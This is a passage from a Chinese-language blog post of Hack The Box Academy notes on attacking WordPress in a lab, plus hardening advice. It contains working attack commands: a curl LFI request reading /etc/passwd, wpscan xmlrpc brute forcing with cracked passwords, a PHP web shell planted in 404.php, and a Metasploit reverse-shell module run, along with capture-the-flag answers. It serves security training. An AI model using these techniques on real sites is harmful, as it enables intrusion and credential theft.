+<h4 id="使用cURL的LFI"><a href="#使用cURL的LFI" class="headerlink" title="使用cURL的LFI"></a>使用cURL的LFI</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://94.237.59.185:31149/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></tbody></table></figure>
+
+<p>sally.jones</p>
+<h2 id="Attacking-WordPress-Users"><a href="#Attacking-WordPress-Users" class="headerlink" title="Attacking WordPress Users"></a>Attacking WordPress Users</h2><h3 id="WordPress用户Bruteforce"><a href="#WordPress用户Bruteforce" class="headerlink" title="WordPress用户Bruteforce"></a>WordPress用户Bruteforce</h3><p>WPScan可用于暴力破解用户名和密码。扫描报告返回了在网站上注册的三个用户：<code>admin</code>、<code>roger</code>和<code>david</code>。该工具使用两种登录暴力攻击，<code>xmlrpc</code>和<code>wp-login</code>。<code>wp-login</code>方法将尝试暴力破解正常的WordPress登录页面，而<code>xmlrpc</code>方法使用WordPress API通过<code>/xmlrpc.php</code>进行登录尝试。最好使用<code>xmlrpc</code>方法，因为它更快。</p>
+<h4 id="WPscan-XMLRPC"><a href="#WPscan-XMLRPC" class="headerlink" title="WPscan - XMLRPC"></a>WPscan - XMLRPC</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com</span><br><span class="line"></span><br><span class="line">[+] URL: http://blog.inlanefreight.com/                                                  </span><br><span class="line">[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               </span><br><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line"></span><br><span class="line">[SUCCESS] - admin / sunshine1</span><br><span class="line">Trying david / Spring2016 Time: 00:00:01 &lt;============&gt; (474 / 474) 100.00% Time: 00:00:01</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: sunshine1</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.59.185:31149</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Remote-Code-Execution-RCE-via-the-Theme-Editor"><a href="#Remote-Code-Execution-RCE-via-the-Theme-Editor" class="headerlink" title="Remote Code Execution (RCE) via the Theme Editor"></a>Remote Code Execution (RCE) via the Theme Editor</h2><h3 id="攻击WordPress后端"><a href="#攻击WordPress后端" class="headerlink" title="攻击WordPress后端"></a>攻击WordPress后端</h3><p>通过对WordPress的管理访问，我们可以修改PHP源代码以执行系统命令。要执行此攻击，请使用管理员凭据登录WordPress，这应该会将我们重定向到管理面板。单击侧面板上的<code>Appearance</code>并选择<code>Theme Editor</code>。这个页面将允许我们直接编辑PHP源代码。我们应该选择一个不活跃的主题，以免破坏主题。</p>
+<h4 id="Theme-Editor-主题编辑器"><a href="#Theme-Editor-主题编辑器" class="headerlink" title="Theme Editor 主题编辑器"></a>Theme Editor 主题编辑器</h4><p><img src="https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png" alt="image"></p>
+<p>我们可以看到活动主题是<code>Transportex</code>，因此应该选择未使用的主题，如<code>Twenty Seventeen</code>。</p>
+<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a>选择主题</h4><p><img src="https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png" alt="image"></p>
+<p>选择一个主题，然后单击<code>Select</code>。接下来，选择一个非关键文件（如<code>404.php</code>）来修改和添加Web Shell。</p>
+<h4 id="Twenty-Seventeen-Theme-404-php"><a href="#Twenty-Seventeen-Theme-404-php" class="headerlink" title="Twenty Seventeen Theme - 404.php"></a>Twenty Seventeen Theme - 404.php</h4><p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The template for displaying 404 pages (not found)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Creating_an_Error_404_Page</span></span><br><span class="line"><span class="comment">&lt;SNIP&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面的代码应该允许我们通过GET参数<code>cmd</code>执行命令。在本例中，我们修改了<code>404.php</code>页面的源代码，并添加了一个名为<code>system()</code>的新函数。这个函数允许我们直接执行操作系统命令，方法是发送一个GET请求，在URL的末尾加上一个问号<code>cmd</code>，并指定一个操作系统命令。修改后的URL应该像这样<code>?</code>。</p>
+<p>我们可以通过在Web浏览器中输入URL或发出下面的<code>cURL</code>请求来验证我们已经实现了RCE。</p>
+<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X GET "http://&lt;target&gt;/wp-content/themes/twentyseventeen/404.php?cmd=id"</span><br><span class="line"></span><br><span class="line">uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Attacking-WordPress-with-Metasploit"><a href="#Attacking-WordPress-with-Metasploit" class="headerlink" title="Attacking WordPress with Metasploit"></a>Attacking WordPress with Metasploit</h2><h3 id="自动化WordPress开发"><a href="#自动化WordPress开发" class="headerlink" title="自动化WordPress开发"></a>自动化WordPress开发</h3><p>我们可以使用Metasploit Framework（MSF）自动获取目标上的反向shell。这需要帐户的有效凭据，该帐户具有足够的权限在Web服务器上创建文件。</p>
+<p>我们可以通过发出以下命令快速启动<code>MSF</code>：</p>
+<h4 id="正在启动Metasploit框架"><a href="#正在启动Metasploit框架" class="headerlink" title="正在启动Metasploit框架"></a>正在启动Metasploit框架</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ msfconsole</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要获得反向shell，我们可以使用<code>wp_admin_shell_upload</code>模块。我们可以很容易地在<code>MSF</code>中搜索它：</p>
+<h4 id="MSF-Search-无国界医生搜寻"><a href="#MSF-Search-无国界医生搜寻" class="headerlink" title="MSF Search 无国界医生搜寻"></a>MSF Search 无国界医生搜寻</h4><p>​                                                                                MSF Search无国界医生搜寻                </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 &gt; search wp_admin</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">#  Name                                       Disclosure Date  Rank       Check  Description</span><br><span class="line">-  ----                                       ---------------  ----       -----  -----------</span><br><span class="line">0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload</span><br></pre></td></tr></tbody></table></figure>
+
+<p>搜索结果中的数字<code>0</code>表示建议模块的ID。从这里开始，我们可以通过其ID号指定模块，以节省保存时间。</p>
+<h4 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 &gt; use 0</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="模块选项"><a href="#模块选项" class="headerlink" title="模块选项"></a>模块选项</h4><p>每个模块都提供了不同的设置选项，我们可以使用这些选项为<code>MSF</code>分配精确的规格，以确保攻击成功。我们可以通过发出以下命令列出这些选项：</p>
+<h4 id="列表选项"><a href="#列表选项" class="headerlink" title="列表选项"></a>列表选项</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/wp_admin_shell_upload):</span><br><span class="line"></span><br><span class="line">Name       Current Setting  Required  Description</span><br><span class="line">----       ---------------  --------  -----------</span><br><span class="line">PASSWORD                    yes       The WordPress password to authenticate with</span><br><span class="line">Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">RPORT      80               yes       The target port (TCP)</span><br><span class="line">SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">TARGETURI  /                yes       The base path to the wordpress application</span><br><span class="line">USERNAME                    yes       The WordPress username to authenticate with</span><br><span class="line">VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">Id  Name</span><br><span class="line">--  ----</span><br><span class="line">0   WordPress</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>在使用<code>set</code>命令进行必要的修改之后，我们可以使用<code>run</code>命令来执行模块。如果我们的所有参数都设置正确，它将在执行时在目标上生成一个反向shell。</p>
+<h4 id="设置选项"><a href="#设置选项" class="headerlink" title="设置选项"></a>设置选项</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts blog.inlanefreight.com</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username admin</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password Winter2020</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lhost 10.10.16.8</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.8z4444</span><br><span class="line">[*] Authenticating with WordPress using admin:Winter202@...</span><br><span class="line">[+] Authenticated with WordPress</span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...</span><br><span class="line">[*] Sending stage (38247 bytes) to blog.inlanefreight.com</span><br><span class="line">[*] Meterpreter session 1 opened</span><br><span class="line">[+] Deleted uTvAAKrAdp.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www—data (33)</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Security-Measures"><a href="#Security-Measures" class="headerlink" title="Security Measures"></a>Security Measures</h1><h2 id="WordPress-Hardening"><a href="#WordPress-Hardening" class="headerlink" title="WordPress Hardening"></a>WordPress Hardening</h2><h2 id="最佳做法"><a href="#最佳做法" class="headerlink" title="最佳做法"></a>最佳做法</h2><p>以下是防止WordPress网站攻击的一些最佳做法。</p>
+<h2 id="执行定期更新"><a href="#执行定期更新" class="headerlink" title="执行定期更新"></a>执行定期更新</h2><p>这是任何应用程序或系统的关键原则，可以大大降低成功攻击的风险。确保WordPress核心以及所有已安装的插件和主题保持最新。研究人员不断发现第三方WordPress插件的缺陷。一些托管服务提供商甚至会执行WordPress核心的持续自动更新。WordPress管理控制台通常会在插件或主题需要更新或WordPress本身需要升级时提示我们。我们甚至可以通过插入以下行来修改<code>wp-config.php</code>文件以启用自动更新：</p>
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">'WP_AUTO_UPDATE_CORE'</span>, <span class="literal">true</span> );</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">add_filter</span>( <span class="string">'auto_update_plugin'</span>, <span class="string">'__return_true'</span> );</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">add_filter</span>( <span class="string">'auto_update_theme'</span>, <span class="string">'__return_true'</span> );</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="插件和主题管理"><a href="#插件和主题管理" class="headerlink" title="插件和主题管理"></a>插件和主题管理</h2><p>仅从WordPress.org网站安装受信任的主题和插件。在安装插件或主题之前，请检查其评论，流行度，安装数量和最后更新日期。如果其中任何一个已经多年没有更新，这可能是一个迹象，表明它不再被维护，并可能遭受未修补的漏洞。审查您的WordPress网站并删除任何未使用的主题和插件。这将有助于确保没有过时的插件被遗忘和潜在的脆弱性。</p>
+<h2 id="增强WordPress安全性"><a href="#增强WordPress安全性" class="headerlink" title="增强WordPress安全性"></a>增强WordPress安全性</h2><p>几个WordPress安全插件可以用来增强网站的安全性。这些插件可用作Web应用程序防火墙（WAF）、恶意软件扫描器、监控、活动审计、暴力攻击预防以及用户的强密码强制执行。这里有一些流行的WordPress安全插件的例子。</p>
+<h4 id="Sucuri-Security"><a href="#Sucuri-Security" class="headerlink" title="Sucuri Security"></a><a target="_blank" rel="noopener" href="https://wordpress.org/plugins/sucuri-scanner/">Sucuri Security</a></h4><ul>
+<li>此插件是一个安全套件，包含以下功能：<ul>
+<li>Security Activity Auditing安全活动审计</li>
+<li>File Integrity Monitoring文件完整性监控</li>
+<li>Remote Malware Scanning远程恶意软件扫描</li>
+<li>Blacklist Monitoring.黑名单监控。</li>
+</ul>
+</li>
+</ul>
+<h4 id="iThemes-Security"><a href="#iThemes-Security" class="headerlink" title="iThemes Security"></a><a target="_blank" rel="noopener" href="https://wordpress.org/plugins/better-wp-security/">iThemes Security</a></h4><ul>
+<li>iThemes Security提供了30多种方法来保护WordPress网站，例如：<ul>
+<li>Two-Factor Authentication (2FA)</li>
+<li>WordPress Salts &amp; Security</li>
+<li>Google reCAPTCHA</li>
+<li>User Action Logging用户操作日志</li>
+</ul>
+</li>
+</ul>
+<h4 id="Wordfence-Security"><a href="#Wordfence-Security" class="headerlink" title="Wordfence Security"></a><a target="_blank" rel="noopener" href="https://wordpress.org/plugins/wordfence/">Wordfence Security</a></h4><ul>
+<li>Wordfence Security由端点防火墙和恶意软件扫描程序组成。<ul>
+<li>WAF识别并阻止恶意流量。</li>
+<li>高级版提供实时防火墙规则和恶意软件签名更新</li>
+<li>Premium还支持实时IP黑名单，以阻止来自已知最恶意IP的所有请求。</li>
+</ul>
+</li>
+</ul>
+<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>用户经常成为攻击目标，因为他们通常被视为组织中最薄弱的环节。以下与用户相关的最佳实践将有助于提高WordPress网站的整体安全性。</p>
+<ul>
+<li>禁用标准<code>admin</code>用户并创建用户名难以猜测的帐户</li>
+<li>强制使用强密码</li>
+<li>为所有用户启用并强制实施双因素身份验证（2FA）</li>
+<li>基于最小权限概念限制用户访问</li>
+<li>定期审核用户权限和访问权限。删除任何未使用的帐户或撤销不再需要的访问权限</li>
+</ul>
+<h2 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h2><p>某些配置更改可以提高WordPress安装的整体安全状态。</p>
+<ul>
+<li>安装一个不允许用户枚举的插件，这样攻击者就无法收集有效的用户名来进行密码喷射攻击</li>
+<li>限制登录尝试以防止密码暴力破解攻击</li>
+<li>禁用<code>wp-admin.php</code>登录页面或重新定位它，使其无法访问Internet或只能由某些IP地址访问</li>
+</ul>
+<h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>需要先添加hosts</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">echo '10.129.179.160 blog.inlanefreight.local'&gt;&gt; /etc/hosts</span><br></pre></td></tr></tbody></table></figure>
+
+<p>WordPress 5.1.6</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --url http://blog.inlanefreight.local/ -e apt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>主题:twentynineteen</p>
+<p>再次枚举用户，还有一个Charlie Wiggins</p>
+<p>访问</p>
+<p><a target="_blank" rel="noopener" href="http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt">http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt</a></p>
+<p>HTB{d1sabl3_d1r3ct0ry_l1st1ng!}</p>
+<p>通过传递author参数，找到有admin和erika两个用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --password-attack xmlrpc -t 20 -U admin, erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/</span><br></pre></td></tr></tbody></table></figure>
+
+<p>LFI插件版本site-editor1.1.1</p>
+<p>访问</p>
+<p><a target="_blank" rel="noopener" href="http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd">http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</a></p>
+<p>用户：frank.mclane</p>
+<p>email那个插件也有洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&amp;report=users&amp;status=all'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>flag</p>
+<p>HTB{unauTh_d0wn10ad!}</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http://blog.inlanefreight.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p>密码:010203</p>
+<p>登陆，更改别的主题更改404.php为一句话目录</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat /home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt </span><br></pre></td></tr></tbody></table></figure>
+
+<p>HTB{w0rdPr355_4SS3ssm3n7} </p>
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>在THM没有这么系统的学习对Wordpress的渗透，这个房间收获挺大的。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/10/24/HackingWordPressHTB/">http://mikannse.space/2023/10/24/HackingWordPressHTB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IntroductiontoBashScriptingHTB</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/23/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E5%9B%9B)%E4%B9%8BHTBwoMillion/" title="打靶记录(五四)之HTBTwoMillion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">打靶记录(五四)之HTBTwoMillion</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div><div><a href="/2023/11/07/IntroToAssemblyShellcodingANDSkill/" title="IntroToAssemblyShellcodingANDSkillHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-07</div><div class="title">IntroToAssemblyShellcodingANDSkillHTB</div></div></a></div><div><a href="/2023/11/04/IntroToAssemblyArchANDAssembDebugger/" title="IntroToAssemblyArchANDAssembDebuggerHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">IntroToAssemblyArchANDAssembDebuggerHTB</div></div></a></div><div><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="title">IntroductiontoBashScriptingHTB</div></div></a></div><div><a href="/2023/11/05/IntroToAssemblyBasicInstructionsANDFunctions/" title="IntroToAssemblyBasicInstructionsANDFunctionsHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-05</div><div class="title">IntroToAssemblyBasicInstructionsANDFunctionsHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress-Overview"><span class="toc-number">1.1.</span> <span class="toc-text">WordPress Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCMS%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是CMS？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress-Structure"><span class="toc-number">1.2.</span> <span class="toc-text">WordPress Structure</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4WordPress%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">默认WordPress文件结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">文件结构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AEWordPress%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">关键WordPress文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">WordPress配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wp-config-php"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">wp-config.php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%9A%84WordPress%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">关键的WordPress目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WP-Content"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">WP-Content</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP-Includes"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">WP-Includes</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2"><span class="toc-number">1.3.</span> <span class="toc-text">WordPress用户角色</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress%E6%A0%B8%E5%BF%83%E7%89%88%E6%9C%AC%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.1.</span> <span class="toc-text">WordPress核心版本枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WP%E7%89%88%E6%9C%AC-%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">WP版本-源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP-Version-CSS"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">WP Version - CSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP-Version-JS-WP%E7%89%88%E6%9C%AC-JS"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">WP Version - JS WP版本- JS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%92%8C%E4%B8%BB%E9%A2%98%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.2.</span> <span class="toc-text">插件和主题枚举</span></a><ol class="toc-child"><li 